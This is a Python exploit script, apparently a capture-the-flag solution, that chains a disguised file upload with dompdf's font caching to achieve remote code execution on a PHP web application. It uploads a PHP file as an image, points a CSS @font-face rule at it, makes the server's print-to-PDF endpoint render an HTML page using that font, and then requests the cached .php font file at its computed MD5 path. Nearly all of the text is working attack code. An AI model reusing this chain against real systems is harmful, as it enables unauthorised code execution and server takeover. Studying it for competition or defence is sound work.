import requests
from hashlib import md5

url = "http://246abfb2-0f91-48ec-a88c-b2314709ed87.node1.mrctf.fun:81"

#url ="http://"
font_name = "deadbeef777"

def print2pdf(page):
    param= {
        "s":"Printer/print",
        "page":page
    }
    res = requests.get(f"{url}/public/index.php",params=param)
    return res

def upload(filename,raw):
    data = {
        "name":"avatar",
        "type":"image",
    }
    res = requests.post(f"{url}/public/index.php?s=admin/upload",data=data,files={"file":(filename,raw,"image/png")})
    return res.json()["result"]



# import requests

# burp0_url = "http://192.168.182.1:8888/public/index.php?s=admin/upload"
# burp0_headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary0MB9PNZAOHbFhduI", "Origin": "http://192.168.182.1:8888", "Referer": "http://192.168.182.1:8888/public/index.php?s=admin/index", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
# burp0_data = "------WebKitFormBoundary0MB9PNZAOHbFhduI\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.png\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x96\x00\x00\x00L\x08\x02\x00\x00\x00\x00\xc6\xd9\xfc\x00\x00\x01\x1bIDATx\x01\xed\xd3\x01\r\x00 \x0c\xc4@\xc0\xbf\xe7-\xc8\xb8\xa4(X[\xfe\xce\xcc\xe9\xc9\x06\x9e||\xb7\x03%\xe4\xffA\tK\xc8\x1b\xe0\x01Za\ty\x03<@+,!o\x80\x07h\x85%\xe4\r\xf0\x00\xad\xb0\x84\xbc\x01\x1e\xa0\x15\x96\x907\xc0\x03\xb4\xc2\x12\xf2\x06x\x80VXB\xde\x00\x0f\xd0\nK\xc8\x1b\xe0\x01Za\ty\x03<@+,!o\x80\x07h\x85%\xe4\r\xf0\x00\xad\xb0\x84\xbc\x01\x1e\xa0\x15\x96\x907\xc0\x03\xb4\xc2\x12\xf2\x06x\x80VXB\xde\x00\x0f\xd0\nK\xc8\x1b\xe0\x01Za\ty\x03<@+,!o\x80\x07h\x85%\xe4\r\xf0\x00\xad\xb0\x84\xbc\x01\x1e\xa0\x15\x96\x907\xc0\x03\xb4\xc2\x12\xf2\x06x\x80VXB\xde\x00\x0f\xd0\nK\xc8\x1b\xe0\x01Za\ty\x03<@+,!o\x80\x07h\x85%\xe4\r\xf0\x00\xad\xb0\x84\xbc\x01\x1e\xa0\x15\x96\x907\xc0\x03\xb4\xc2\x12\xf2\x06x\x80VXB\xde\x00\x0f\xd0\nK\xc8\x1b\xe0\x01Za\ty\x03<@+,!o\x80\x07h\x85%\xe4\r\xf0\x00\xad\x90O\xb8s\xb6\x03\x95\xa6\xed\xda\xe6\x00\x00\x00\x00IEND\xaeB`\x82\r\n------WebKitFormBoundary0MB9PNZAOHbFhduI\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\navatar\r\n------WebKitFormBoundary0MB9PNZAOHbFhduI\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\nimage\r\n------WebKitFormBoundary0MB9PNZAOHbFhduI--\r\n"
# requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

#res = requests.post(f"{url}/public/index.php?s=admin/upload",data=data,files={"file":("img.html",payload,"image/png")})

exp_font = "./exp.php"

php_location = upload("exp.php",open(exp_font,"rb").read())

print(f"php_location=>{php_location}")

exp_css = f"""
@font-face{{
    font-family:'{font_name}';
    src:url('http://localhost:81{php_location}');
    font-weight:'normal';
    font-style:'normal';
}}
"""
# exp_css = """
# @font-face {
#     font-family: layui-icon;
#     src: url(../font/iconfont.eot?v=256);
#     src: url(../font/iconfont.eot?v=256#iefix) format('embedded-opentype'),url(../font/iconfont.woff2?v=256) format('woff2'),url(../font/iconfont.woff?v=256) format('woff'),url(../font/iconfont.ttf?v=256) format('truetype'),url(../font/iconfont.svg?v=256#layui-icon) format('svg')
# }
# """

css_location = upload("exp.css",exp_css)

print(f"css_location=>{css_location}")


html = f"""
<link rel=stylesheet href='http://localhost:81{css_location}'><span style="font-family:{font_name};">5678</span>
"""

html_location = upload("exp.html",html)

#html_location = "/public/storage/image/avatar/20220423/64a4b37854785db2ebbb242490986cba.html"



payload = "/storage/"
print(f"html_location=>{html_location}")

#p = "/public/index.php?s=index/show&pic=05.jpg\"/>"+html+"<span "

p = html_location

print(p)

res  = print2pdf(p)

#print(res.text)

open("out.pdf","wb").write(res.content)

#open("test.pdf","wb").write(res.content)
md5helper = md5()

md5helper.update(f"http://localhost:81{php_location}".encode())

remote_path = f"/vendor/dompdf/dompdf/lib/fonts/{font_name}-normal_{md5helper.hexdigest()}.php"

print(f"remote_path=>{remote_path}")

res = requests.get(url+remote_path)

print(res.text)

